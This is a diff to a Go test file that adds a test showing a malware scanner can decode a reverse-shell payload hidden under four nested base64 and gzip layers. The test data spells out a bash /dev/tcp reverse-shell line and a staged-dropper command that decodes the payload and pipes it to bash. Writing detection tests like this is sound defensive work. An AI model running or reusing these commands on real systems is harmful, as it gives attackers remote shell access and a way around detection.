@@ -335,3 +335,31 @@ func TestDecodeAndRescan_PythonDynamicHex(t *testing.T) {
 		t.Errorf("expected layer 'hex', got %v", layers)
 	}
 }
+
+// TestDecodeAndRescan_NestedChainsToDepth5 proves the deobfuscation BFS now
+// reaches layer 4: base64 → gzip → base64 → gzip around a reverse-shell
+// payload — a chain shape real staged droppers use. At the old depth cap (3)
+// this payload evaded detection entirely.
+func TestDecodeAndRescan_NestedChainsToDepth5(t *testing.T) {
+	cfg := config.NewDefaultConfig()
+	ctx := context.Background()
+
+	rawShell := []byte("#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
+
+	// base64 → gzip → base64 → gzip → raw payload (4 encode layers deep).
+	layer1 := gzipCompress(rawShell)
+	layer2 := []byte(base64.StdEncoding.EncodeToString(layer1))
+	layer3 := gzipCompress(layer2)
+	layer4 := []byte(base64.StdEncoding.EncodeToString(layer3))
+
+	// The outer wrapper mimics the staged dropper's decode command.
+	scriptContent := []byte(fmt.Sprintf("#!/bin/bash\necho %s | base64 -d | gunzip | base64 -d | gunzip | bash\n", layer4))
+
+	matches, layers, _ := scanner.DecodeAndRescanWithYARA(ctx, "/tmp/staged_dropper.sh", scriptContent, nil, cfg, nil, nil)
+	if len(matches) == 0 {
+		t.Fatalf("expected detection of reverse shell nested 4 layers deep (depth-5 BFS), got none")
+	}
+	if len(layers) < 4 {
+		t.Errorf("expected decode layer history >= 4, got %v", layers)
+	}
+}
